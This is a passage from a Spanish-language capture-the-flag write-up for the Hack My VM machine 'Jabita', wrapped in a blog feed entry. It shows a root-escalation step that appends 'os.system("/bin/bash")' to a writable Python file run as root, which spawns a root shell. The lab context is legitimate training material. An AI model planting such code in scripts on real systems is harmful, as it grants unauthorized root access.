+<p>Vemos que concuerda y además podemos escribir, por lo que podemos hacer que nos otorgue una Shell añadiendo lo siguiente:</p>
+
+<pre><code class="language-Python">def first():
+    print("Hello")
+import os
+os.system("/bin/bash")
+</code></pre>
+
+<p>Bien! Tras volver a ejecutar el fichero como <code class="language-plaintext highlighter-rouge">root</code> hemos podido ganar la Shell! Qué fácil!</p>]]></content><author><name>BlackCage</name><email>blackcage_jr@protonmail.com</email></author><category term="HMV" /><summary type="html"><![CDATA[Jabita [ Hack My VM ]]]></summary></entry></feed>
